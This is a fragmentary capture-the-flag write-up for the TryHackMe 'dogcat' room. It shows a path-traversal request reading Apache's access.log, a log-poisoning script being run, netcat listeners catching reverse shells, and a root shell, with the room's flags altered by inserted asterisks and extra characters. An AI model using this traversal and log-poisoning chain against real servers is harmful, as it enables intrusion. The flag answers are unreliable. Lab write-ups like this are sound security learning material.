...
```
bibo318@parrot:~/CTFs/tryhackme/dogcat$ echo -n 'PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=' | base64 -d
<?php
$flag_1 = "THM{V0N318*****Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```
...
```
bibo318@parrot:~/CTFs/tryhackme/dogcat$ python3 log_poison.py
```
...
```
10.8.106.222 - - [04/Oct/2020:09:22:39 +0000] "GET /?view=dog..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log&ext= HTTP/1.1" 200 18968 "-" "THM{V0N318*****LF1_t0_RC3_aec3fb}
```

`THM{V0N318*****LF1_t0_RC3_aec3fb12**123:))}`
...
```
bibo318@parrot:~/CTFs/tryhackme/dogcat$ nc -nlvp 9001
...
flag3.txt
cat flag3.txt
THM{V0N318*****D1ff3r3nt_3nv1ronments_874112}
```

1. What is flag 3?

`THM{V0N318*****D1ff3r3nt_3nv1ronments_87411212**123:))}`
...
```
bibo318@parrot:~/CTFs/tryhackme/dogcat$ nc -nlvp 8888
...
cat flag4.txt
THM{V0N318*****esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
root@dogcat:~#
```

`THM{V0N318*****esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d12**123:))}`
